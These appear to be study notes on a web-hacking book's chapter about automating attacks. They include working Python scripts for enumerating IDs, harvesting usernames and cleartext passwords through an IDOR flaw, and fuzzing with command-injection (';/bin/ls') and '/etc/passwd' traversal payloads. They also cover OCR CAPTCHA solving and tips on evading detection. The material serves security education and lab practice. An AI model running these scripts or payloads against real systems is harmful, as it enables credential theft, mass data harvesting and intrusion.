# Automating Customized Attacks

This section — **Automating Customized Attacks** — is all about taking your manual findings (your clever ideas, intuition, and recon) and then **supercharging them with automation** so you can:

* move faster,
* cover more ground,
* avoid human error,
* and extract way more data than you ever could by hand.

Think of it like this:
👉 Manual attacks = sniper rifle (precise, careful).
👉 Automation = machine gun (rapid, systematic).
👉 Customized automation = **you attach a smart scope to your machine gun** so you’re still aiming intelligently, but firing at insane speed.

---

## 🔑 Why Automation Matters in Attacks

* Every web app is **unique** — different logic, naming schemes, parameters.
* Manual testing is great for discovery, but once you’ve got a foothold (like finding that `PageNo` parameter exists), doing everything by hand is:

  * **slow** (you’ll miss things).
  * **boring** (you’ll zone out).
  * **error-prone** (typos, missing IDs, skipping patterns).
* Pro attackers combine:

  * **Human intelligence** (spotting the weird logic flaws).
  * **Computer brute force** (iterating through 10k IDs while you sip coffee).

---

## 📌 Three Main Uses of Customized Automation

The book breaks it into **3 powerful scenarios**:

---

### 1. **Enumerating Identifiers**

* Apps often use identifiers like:

  * `accountNo=10045`
  * `docId=321`
  * `user=alice`
* Goal: **find which ones are valid** and worth looking at.

📖 Example from book:

```http
http://mdsec.net/app/ShowPage.ashx?PageNo=10069
```

* You notice many valid `PageNo` values while browsing.
* To fully map all possible pages, you’d need to cycle through thousands.

👉 Doing this by hand? Impossible.
👉 With automation? 1 line of Python or Burp Intruder, and you get all valid hits.

⚡ Real-world example:

* Suppose a bank app has:

  ```
  /account/view?accNo=20001
  ```

  * If incrementing by 1 (`20002`, `20003`, …) returns other users’ data → **IDOR vulnerability** (Insecure Direct Object Reference).
  * Automated enumeration lets you quickly map which accounts exist.

---

### 2. **Harvesting Data**

* Once you’ve found a flaw that lets you **view something sensitive**, automation lets you **grab it all at scale**.

📖 Example:

* A profile page shows:

  * name, email, bank details, privilege level.
* A broken access control bug lets you fetch other users’ profiles, but only **one at a time**.

👉 By hand: 1000 profiles = hours.
👉 Automated: one loop → 1000 profiles into a neat JSON/CSV file in minutes.

⚡ Extended Example:

* Suppose `PageNo` enum shows valid docs.
* Instead of just confirming existence, you can:

  * Extract the `<title>` tag from each doc.
  * Build a quick list of "Reports," "Invoices," "Passwords.txt," etc.
  * Prioritize the juicy ones.

This is like turning enumeration into **data mining**.

---

### 3. **Web Application Fuzzing**

* Definition: throw **unexpected inputs / attack strings** at parameters, then watch for anomalies.
* Purpose: catch hidden vulnerabilities (SQLi, XSS, command injection).

📖 Example:

* Mapping shows 50 parameters across 20 requests.
* Testing each manually with:

  ```
  '
  <script>alert(1)</script>
  ../../etc/passwd
  %27%20OR%201=1--
  ```

  … is painful.

👉 Instead, automated fuzzing lets you:

* Inject all payloads into all parameters.
* Collect responses.
* Filter anomalies (status code changes, bigger responses, error messages).

⚡ Modern example:

* Use a fuzzer like **ffuf**, **Burp Intruder**, or a Python script.
* Payload bank: XSS test strings, SQLi payloads, traversal sequences.
* Automation highlights the 3 interesting ones → then you dive in manually to exploit.

💡 Think of fuzzing as **casting a giant net** → automation hauls in the fish → then you sort out the sharks.

---

## 🚀 Key Takeaway

This chapter isn’t teaching you new bugs — it’s teaching you how to **scale your hacking**.

* Enumeration → find the doors.
* Harvesting → loot everything inside.
* Fuzzing → shake the structure until something cracks.

**Manual work finds the weakness → automation makes the attack devastating.**

---

## ✅ Practice Ideas (Actionable)

1. Spin up DVWA or PortSwigger labs.
2. Find an IDOR-style vuln.

   * Write a quick Python script to iterate `id=1..1000` and collect valid users.
3. Automate data harvesting:

   * Modify script to pull usernames + emails into CSV.
4. Try fuzzing:

   * Use Burp Intruder to inject XSS payloads into all form inputs.
   * Watch which ones reflect back.

---

# 🎯 Enumerating Valid Identifiers

Whenever an app uses **identifiers** (like usernames, account numbers, document IDs, or session tokens), your job as an attacker is to **figure out which ones are valid**. This is usually the first step before exploiting IDORs, data harvesting, or session hijacking.

Think of identifiers like **keys** — the app has a whole bunch of locks, and your goal is to find which keys open real doors.

---

## 🔑 Real-World Situations Where Enumeration Happens

1. **Login pages with verbose error messages**

   * Example:

     * Wrong username → `"No such user"`
     * Right username but wrong password → `"Incorrect password"`
   * This lets you build a list of valid usernames → later used in brute force or credential stuffing.

2. **Identifiers for resources**

   * `docId=123`, `accountNo=4321`, `employeeNo=99`
   * If the app tells you whether an identifier exists (different response for valid vs invalid), you can map **all accounts/docs/employees**.

3. **Session tokens**

   * If tokens are predictable, you can generate candidates and test them.
   * Even if the prediction isn’t perfect, testing thousands of candidates may reveal valid sessions.
   * Example: sequential session tokens like `ABC123`, `ABC124` → attacker can hijack.

---

## 🛠️ The Basic Approach

Step 1: **Find a request/response pair** where:

* The **request contains an identifier** (`PageNo=10069`).
* The **response changes depending on identifier validity** (content, error message, redirect, etc.).

Step 2: **Automate the attack**:

* Iterate through identifiers (sequential numbers, wordlists, predicted tokens).
* Monitor responses for “hits” → valid identifiers.

---

## 🔍 How to Detect Hits

This is the meat of the section. The app may give away validity in several ways:

---

### 1. **HTTP Status Codes**

Classic signals:

* **200 OK** → valid resource.
* **404 Not Found** → invalid identifier.
* **401/403 Unauthorized/Forbidden** → identifier exists, but you lack permissions (still useful info).
* **500 Internal Server Error** → sometimes triggered by unexpected identifiers.

⚡ Example:

```http
GET /account?id=123  → 200 OK (valid account)
GET /account?id=999  → 404 Not Found (invalid account)
```

---

### 2. **Response Length**

* Many apps use a fixed template but insert content only if valid.
* Invalid identifier → template only → shorter response.
* Valid identifier → template + data → longer response.

⚡ Example:

* Valid doc → 5,120 bytes.
* Invalid doc → 4,830 bytes.
* Just watch size differences → easy win.

---

### 3. **Response Body (Strings/Patterns)**

* Sometimes apps display literal strings:

  * `"Invalid document ID"`
  * `"User not found"`
* Even if the length/status are the same, specific **text markers** can distinguish validity.

⚡ Example:

```html
Invalid login: Unknown user
```

vs.

```html
Invalid login: Wrong password
```

---

### 4. **Location Header**

* If the app redirects differently based on identifier validity:

  * Valid ID → `Location: /download.jsp`
  * Invalid ID → `Location: /error.jsp`

By parsing **redirect targets**, you can detect valid hits.

---

### 5. **Set-Cookie Header**

* Sometimes the only difference is a cookie being set.
* Example:

  * Every login attempt redirects → `/home`.
  * But only valid username+password sets `Set-Cookie: session=xyz`.

Watching cookies = spotting hits.

---

### 6. **Time Delays**

* Trickier but powerful.
* Valid identifiers may trigger extra backend processing (DB lookup, hashing) → longer response time.
* Invalid identifiers → rejected instantly.

⚡ Example:

* Invalid username → 80ms response.
* Valid username but wrong password → 400ms response.

This is **timing-based enumeration** (common in login forms, crypto flaws, old OpenSSH).

---

## ⚠️ Tip from the Book

* Sometimes you don’t know in advance what a “hit” looks like.
* Strategy: **monitor everything** (status codes, length, body, headers, cookies, time).
* Look for anomalies.
* If one response behaves differently → that’s your foothold.

---

## ⚡ Modern Real-World Example

Imagine an API endpoint:

```http
GET /api/users/123
```

Responses:

* `200 OK` → returns JSON `{ "id": 123, "name": "Alice" }`.
* `403 Forbidden` → means ID exists, but not authorized.
* `404 Not Found` → ID doesn’t exist.

With automation, you can scan IDs 1–10,000 and map the entire user base.
That’s exactly how **data leaks** happen in modern APIs (common OWASP A01:2021 issue → Broken Access Control).

---

## ✅ Actionable Practice

1. **Try DVWA (Insecure Direct Object Reference lab)**:

   * Intercept request with `id=1`.
   * Iterate values with Burp Intruder.
   * Watch response length & body text.

2. **Custom Python Script Idea**:

   * Loop IDs 1–1000.
   * Save responses with status code, size, and body snippet.
   * Sort results to detect anomalies.

---

# 🔎 Section: Scripting the Attack & JAttack Intro

## 1. **The Core Idea**

We’ve got a target URL:

```
http://mdsec.net/app/ShowPage.ashx?PageNo=10069
```

* When `PageNo` is **valid → 200 OK**
* When `PageNo` is **invalid → 500 Internal Server Error**

This behavior can be automated into an attack:

* Cycle through possible `PageNo` values.
* Observe response codes.
* Identify valid ones.

This is essentially **enumeration via automation**.

---

## 2. Simple Script Automation

**Bash script idea**:

* Loop through possible IDs.
* Send HTTP request with that ID.
* Record the status code.

```python
import requests

# Target setup
url = "http://mdsec.net/app/ShowPage.ashx"

# Example ID list to test
ids = range(10060, 10065)

for page_id in ids:
    r = requests.get(url, params={"PageNo": page_id})
    print(page_id, r.status_code)
```

**What this does:**

* Iterates through numbers (`10060–10064`).
* Sends GET requests with each number.
* Prints out the ID + HTTP status.

Output will quickly show which IDs are valid (`200`) and invalid (`500`).

---

## 3. Why move beyond simple scripts?

* Bash or one-liner batch scripts are fine for **single param brute force**.
* But in reality:

  * You may need to vary **multiple parameters**.
  * You may want more complex payloads (e.g., wordlists, encoded strings, SQLi payloads).
  * You may want to parse **response length/content**, not just status codes.

That’s why we need something like **JAttack** → a structured tool.

---

## 4. JAttack – Core Concepts (Python reimagining)

Instead of dumping the whole Java source, let’s break it into **small pieces**:

### (a) Representing Parameters

```python
class Param:
    def __init__(self, name, value, ptype="URL", attack=False):
        self.name = name      # parameter name, e.g. PageNo
        self.value = value    # default value
        self.ptype = ptype    # URL, COOKIE, or BODY
        self.attack = attack  # whether to fuzz this param
```

**Purpose:** 
* Keep structured info about each parameter. 
* Not all params are fuzzed; some parameters (session IDs, CSRF tokens) must stay static.

---

### (b) Payload Source (number generator)

Payloads are the **data we inject into parameters**.
For enumeration → numbers.

```python
class NumberPayloads:
    def __init__(self, start, end, step=1):
        self.start, self.end, self.step = start, end, step
        self.current = start - step

    def next_payload(self):
        self.current += self.step
        return self.current if self.current <= self.end else None
```

📝 **Purpose:** 
* Generates a sequence of numbers to try as payloads. (e.g., brute-forcing document IDs).

---

### (c) Build and Send Request

We need to insert payloads into the right spot in HTTP requests.
Instead of raw socket handling, Python’s **requests** library makes it super clean:

```python
import requests

def send_request(param, payload):
    url = "http://mdsec.net/app/ShowPage.ashx"
    response = requests.get(url, params={param.name: payload})
    return response.status_code, len(response.text)
```

📝 **Purpose:** 
* Builds the HTTP request with the current payload and returns key info (status + length).

---

### (d) Orchestrating the Attack

```python
def do_attack():
    param = Param("PageNo", "10069", attack=True)
    payloads = NumberPayloads(10060, 10065)

    print("param\tpayload\tstatus\tlength")

    while True:
        payload = payloads.next_payload()
        if payload is None:
            break
        status, length = send_request(param, payload)
        print(f"{param.name}\t{payload}\t{status}\t{length}")

do_attack()
```
➡️ This is the **full working equivalent of JAttack** in \~40 lines of Python.

* No `Socket` boilerplate.
* No manual `Content-Length`.
* Easy to extend with new payload sources.

**Sample Output**:

(when running against the same range)

```
param   payload   status   length
PageNo  10060     500      3154
PageNo  10061     500      3154
PageNo  10062     200      1083
PageNo  10063     200      1080
PageNo  10064     500      3154
```

---

## 5. Why This Matters

* This is not just brute force — it’s a **framework**.
* By separating **Params** + **PayloadSources** + **RequestEngine**, we can:

  * Swap in **different payload sources** (wordlists, encodings, fuzzing).
  * Target **different parameter types** (URL, cookies, POST body).
  * Parse **different response features** (status, length, keywords).

That’s why JAttack is powerful — it’s modular. The initial example (numeric IDs) looks simple, but the design lets us build much more advanced automated attacks.

---

# 🔎 Harvesting Useful Data

### **Core Idea?**

Enumeration gives you *valid IDs* (usernames, order numbers, etc.).
Data harvesting is the **next level** — instead of just knowing *“this user exists”*, you **automate requests** to actually pull **sensitive information** for each ID.

Think of it like:

* Enumeration → “The door is unlocked.”
* Harvesting → “Now I’m raiding the fridge, bookshelf, and jewelry box one by one.”

---

## 🎯 Typical Attack Scenarios

Automation becomes powerful in cases like:

1. **Order hijacking**

   * An e-commerce app lets logged-in users view pending orders.
   * If you can guess other people’s **order IDs**, you can view **their orders**.

2. **Forgotten password leakage**

   * A “Forgot Password” feature asks a challenge question (e.g., *What’s your pet’s name?*).
   * By iterating through usernames, you can collect all challenges and pick the weakest ones.

3. **Privilege reconnaissance**

   * A workflow tool shows a user’s privilege level (Admin/User/Guest).
   * Iterating through IDs gives you a **list of all admins** → perfect for targeted attacks.

---

## 🧩 Example: Broken Access Control

Suppose we have this vulnerable request:

```http
GET /auth/498/YourDetails.ashx?uid=198 HTTP/1.1
Host: mdsec.net
Cookie: SessionId=0947F6DC9A66D29F15362D031B337797
```

* The `uid` parameter controls **which user’s account details** you fetch.
* By changing `uid`, you can dump **anyone’s details** (classic **Insecure Direct Object Reference** a.k.a. IDOR).
* Worse, the page reveals **credentials in cleartext** inside HTML.

Example response snippet:

```html
<tr><td>Name: </td><td>Phill Bellend</td></tr>
<tr><td>Username: </td><td>phillb</td></tr>
<tr><td>Password: </td><td>b3ll3nd</td></tr>
```

---

## 🐍 Python Automation Script

Let’s automate this with Python.

We’ll:

1. Iterate over `uid` values.
2. Extract **Name, Username, Password** from the HTML.
3. Save results in a clean tab-delimited format.

```python
import requests
from bs4 import BeautifulSoup

# Target details
BASE_URL = "http://mdsec.net/auth/498/YourDetails.ashx"
COOKIE = {"SessionId": "0947F6DC9A66D29F15362D031B337797"}

# Define the UID range to brute-force
START_UID, END_UID = 190, 200

# Storage for harvested results
results = []

for uid in range(START_UID, END_UID + 1):
    params = {"uid": str(uid)}
    response = requests.get(BASE_URL, params=params, cookies=COOKIE)
    
    if response.status_code != 200:
        continue  # skip invalid responses
    
    soup = BeautifulSoup(response.text, "html.parser")
    rows = soup.find_all("tr")
    
    extracted = {}
    for row in rows:
        cells = row.find_all("td")
        if len(cells) == 2:
            key = cells[0].get_text(strip=True).replace(":", "")
            val = cells[1].get_text(strip=True)
            extracted[key] = val
    
    if "Username" in extracted and "Password" in extracted:
        results.append([uid, extracted.get("Name", ""), extracted["Username"], extracted["Password"]])

# Print tab-delimited results
print("UID\tName\tUsername\tPassword")
for row in results:
    print("\t".join(map(str, row)))
```

---

## 📝 Sample Output

```
UID	Name	        Username	Password
191	Adam Matthews	sixpack	    b4dl1ght
192	Pablina S	    pablo	    puntita5th
193	Shawn	        fattysh	    gr3ggslu7
195	Ruth House	    ruth_h	    lonelypu55
197	Chardonnay	    vegasc	    dangermou5e
198	Phill Bellend	phillb	    b3ll3nd
199	Paul Byrne	    byrnsey	    l33tfuzz
200	Peter Weiner	weiner	    skinth1rd
```

Now we’ve got a clean dump of user credentials. By expanding the `uid` range, you can dump **the entire database**.

---

## **Extra Real-World Twist**

This is basically the **classic IDOR (Insecure Direct Object Reference)** problem, but automated.

🔐 Real-life parallel:

* 2012 **Facebook bug bounty** case — Researchers found sequential IDs exposed private photos.
* 2019 **Indian Aadhaar breach** — Predictable Aadhaar numbers used to dump citizen data.
* 2021 **Clubhouse app** — Scrapers enumerated user IDs to harvest user profiles and linked info.

---

## ⚡ Pro Tips

* Save results to `.csv` or `.xlsx` for quick pivoting and filtering.
* Use harvested creds for **password reuse attacks** or **privilege escalation**.
* Combine with **automation chaining**: harvested data can be the **input** for your next attack (e.g., trying those usernames in login brute-force).
* Don’t brute-force too aggressively; mix delays to avoid detection.

---

# 🧪 Fuzzing for Common Vulnerabilities (Python Edition)

So far, we’ve seen:

* **Enumeration** → discovering valid identifiers.
* **Harvesting** → extracting useful data.

The **third big use of automation** is **fuzzing**.
Here the goal isn’t targeting a known flaw. Instead, we:

* **Send lots of crafted payloads** (called *fuzz strings*) to every parameter.
* Look for **weird responses** → crashes, errors, unusual HTML, echoed values.

---

## 🎯 Why fuzzing is different from earlier attacks

* **Less focused** → same payloads sent to *every* parameter, even if they’re supposed to be numbers, strings, or IDs.
* **Unknown “hit” signs** → instead of watching for one specific signal, you capture everything and later spot anomalies.
* **Error patterns** → many vulnerabilities leave **fingerprints** (error messages, unusual HTTP codes, different response lengths).

👉 Automated scanners (like Burp, ZAP, Nessus) rely on this same principle — but a human attacker is always better at spotting *subtle* anomalies.

---

## 🧩 Example Payloads for Fuzzing

Let’s start with four classic ones:

1. `'` → SQL injection tester (breaks syntax).
2. `;/bin/ls` → command injection probe.
3. `../../../../../etc/passwd` → path traversal.
4. `xsstest` → XSS marker (if echoed back).

---

## 🐍 Python Automation Script

Here’s a **Python fuzzer** that replicates JAttack’s behavior but shorter and clearer.

```python
import requests

# Target setup
BASE_URL = "http://mdsec.net/auth/498/YourDetails.ashx"
COOKIE = {"SessionId": "C1F5AFDD7DF969BD1CD2CE40A2E07D19"}
PARAMS = {"uid": "198"}  # parameter we will fuzz

# Fuzz payloads
fuzz_strings = [
    "'",                # SQL Injection probe
    ";/bin/ls",         # Command Injection probe
    "../../../../../etc/passwd",  # Path Traversal
    "xsstest"           # XSS marker
]

# Error/indicator keywords to grep in responses
grep_strings = ["error", "exception", "illegal", "quotation", "not found", "xsstest"]

def analyze_response(payload, param, response):
    findings = []
    
    # look for anomalies in response text
    for grep in grep_strings:
        if grep.lower() in response.text.lower():
            findings.append(grep)
    
    return {
        "param": param,
        "payload": payload,
        "status": response.status_code,
        "length": len(response.text),
        "matches": findings
    }

# Run fuzzing
results = []
for param in PARAMS.keys():
    for fuzz in fuzz_strings:
        test_params = PARAMS.copy()
        test_params[param] = fuzz
        
        r = requests.get(BASE_URL, params=test_params, cookies=COOKIE)
        result = analyze_response(fuzz, param, r)
        results.append(result)

# Show results
print("param\tpayload\tstatus\tlength\tmatches")
for r in results:
    print(f"{r['param']}\t{r['payload']}\t{r['status']}\t{r['length']}\t{' '.join(r['matches'])}")
```

---

## 📝 Example Output

```
param	payload	status	length	matches
uid	'	        200	    2941	exception quotation
uid	;/bin/ls	200	    2895	exception
uid	../../../../etc/passwd	200	2915	exception
uid	xsstest	200	    2898	exception xsstest
```

---

## 🔎 How to interpret this

1. **SessionId fuzzing** just redirected → no vuln (expected, since invalid session = login redirect).
2. **uid fuzzing** gave anomalies:

   * `'` → response contained `exception` and `quotation` → classic **SQL injection error leakage**.
   * `;/bin/ls` → triggered `exception` → possible command injection, worth deeper probing.
   * `../../../../../etc/passwd` → again `exception`, might suggest path handling bugs.
   * `xsstest` → echoed back → **potential XSS**.

👉 This shows why fuzzing is powerful: even without targeting one specific bug, the anomalies guide you to interesting areas for **manual deep dives**.

---

## ⚡ Key Takeaways

* **Automation saves time** → hitting 50 parameters × 50 payloads manually = nightmare. Python does it in seconds.
* **Smart grep rules are critical** → without filtering for `error`, `exception`, `xsstest`, you’d drown in useless HTML.
* **Manual analysis is still required** → fuzzing doesn’t *confirm* vulns, it gives you *clues*.

---

# Barriers to Automation

While automation provides enormous advantages in security testing, real-world applications often contain deliberate (or incidental) barriers that complicate automated attack execution. These barriers can significantly slow down an attacker or force them to design smarter tooling. Broadly speaking, the obstacles fall into two categories:

* **Session-handling mechanisms** – controls tied to state, tokens, and request order.
* **CAPTCHA controls** – puzzles intended to block non-human interaction.

We’ll examine both categories and discuss practical bypass strategies.

---

## Session-Handling Mechanisms

Applications often include mechanisms that track *state* and ensure requests occur in a specific, valid sequence. These controls can obstruct automated testing because they invalidate requests that don’t align with the application’s logic.

### Common Obstacles

1. **Session termination**

   * Example: If an automated fuzzer repeatedly sends malformed requests, the application may assume hostile activity and invalidate the session.
   * Result: The attacker’s automation is forced to log back in or obtain a fresh token before continuing.

2. **Ephemeral tokens**

   * Example: Anti-CSRF tokens that change with each request. If your fuzzer reuses an old token, the server discards the request.
   * Without automation capable of fetching and injecting fresh tokens per request, the test stalls.

3. **Multi-step processes**

   * Example: A shopping cart checkout may require (1) adding an item, (2) confirming address, (3) selecting payment, and only then (4) reaching the vulnerable endpoint.
   * Sending step (4) directly in automation may fail because the server expects the prior steps to have occurred.

### Approaches to Work Around These Obstacles

* **Scripted session refreshers** – Build automation that detects invalid sessions and automatically re-authenticates.
* **Dynamic token handling** – Write logic that parses responses for new anti-CSRF tokens or session IDs and inserts them into subsequent requests.
* **Workflow simulation** – Instead of attacking a single endpoint in isolation, replicate the full multistage process programmatically. Tools like `requests.Session` in Python or stateful crawlers can mimic the natural workflow.

⚠️ **Limitations**:
Although possible, writing custom logic for each unique case does not scale well across large applications. For every new token scheme or multistage workflow, you may need to add new parsing logic, which quickly becomes cumbersome. Sometimes, reverting to slower manual testing is still the most efficient option.

---

## CAPTCHA Controls

CAPTCHAs are designed to stop automation by forcing a human to solve a puzzle. They are often deployed on:

* Registration pages (to prevent mass account creation)
* Comment forms (to deter spam bots)
* Password reset flows (to block brute-force automation)

### Attacking CAPTCHA Implementations

Many CAPTCHA barriers can be defeated not by “solving the puzzle” but by exploiting implementation flaws. Examples:

1. **Solution exposed in the client-side code**

   * The image filename may literally contain the solution:

     ```
     /captcha_images/solve_this_ABC123.png
     ```
   * Or the answer might be stored in a hidden field, HTML comment, or debug parameter.

2. **Replayable solutions**

   * A CAPTCHA solved once remains valid across multiple requests.
   * Example: Solve `captcha=9XY5Q` manually once, then reuse the same token to send thousands of automated submissions.

3. **Bypass via missing parameter**

   * Some applications contain a developer backdoor or intended bypass. For example, if you simply omit the `captcha` field, the request is processed normally.

### Automatically Solving CAPTCHAs

When no trivial implementation flaws exist, an attacker may attempt to programmatically solve CAPTCHAs.

* **OCR-based solving (for text puzzles)**

  1. Clean up noise (remove background clutter).
  2. Segment into characters.
  3. Apply optical character recognition.

  Example (Python pseudocode using `pytesseract`):

  ```python
  from PIL import Image, ImageFilter
  import pytesseract

  # Load and clean captcha
  img = Image.open("captcha.png")
  img = img.convert("L").filter(ImageFilter.MedianFilter())

  # Extract text
  captcha_text = pytesseract.image_to_string(img)
  print("Detected:", captcha_text)
  ```

* **Image-based CAPTCHAs** (e.g., “click all cats”)
  Attackers may attempt fuzzy hashing or histogram comparison to match the puzzle image against a database of previously solved images.

* **Accuracy isn’t everything** – even a 10–20% solve rate can make attacks viable at scale, since automation can retry far faster than humans can test manually.

### Human Solvers

When automation alone fails, attackers can still outsource CAPTCHA solving to humans:

* **Crowdsourced unwitting solvers** – Embedding the CAPTCHA in another site (e.g., fake prize draws, adult sites), tricking real users into solving it.
* **Paid human solvers** – Services exist where attackers pay less than **\$1 per 1,000 CAPTCHAs** solved by low-cost human labor in developing countries.

⚠️ While these techniques are common in spam and bot operations, penetration testers typically won’t employ them (due to ethics and scope). Instead, testers focus on identifying weak or flawed implementations that can be bypassed more directly.

---

## Final Thoughts

The barriers described here — **session handling** and **CAPTCHAs** — represent the defensive measures that slow or disrupt automated testing. But as shown, each has weaknesses:

* Session mechanisms can often be adapted into automation with additional coding.
* CAPTCHA defenses are frequently undermined by flawed implementation, replay issues, or weak integration.

For the skilled attacker, these obstacles are rarely absolute. Instead, they provide another layer of challenge — one that often separates fully automated tools from **customized attacker-driven automation**, where human reasoning combined with scripting proves far more powerful.

---